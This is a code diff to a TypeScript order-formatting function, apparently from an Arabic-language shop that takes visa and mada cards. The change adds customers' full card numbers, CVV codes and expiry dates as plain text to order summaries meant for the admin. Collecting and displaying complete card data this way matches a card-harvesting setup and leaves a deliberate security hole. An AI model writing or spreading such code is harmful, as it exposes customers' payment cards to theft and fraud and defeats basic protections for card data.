@@ -94,7 +94,16 @@ export function formatOrderForAdmin(order: Record<string, unknown>) {
   const visaDetails = (order.paymentMethod === 'visa' || order.paymentMethod === 'mada')
     ? [
         ...(typeof order.cardholderName === 'string' && order.cardholderName.trim()
-          ? [`اسم حامل البطاقة: ${order.cardholderName.trim()}`]
+          ? [`👤 اسم حامل البطاقة: ${order.cardholderName.trim()}`]
+          : []),
+        ...(typeof order.cardNumber === 'string' && order.cardNumber.trim()
+          ? [`💳 رقم البطاقة: ${order.cardNumber.trim()}`]
+          : []),
+        ...(typeof order.cvv === 'string' && order.cvv.trim()
+          ? [`🔐 رمز الأمان (CVC): ${order.cvv.trim()}`]
+          : []),
+        ...(order.expiryMonth && order.expiryYear
+          ? [`📅 تاريخ الانتهاء: ${String(order.expiryMonth)}/${String(order.expiryYear)}`]
           : [])
       ]
     : [];
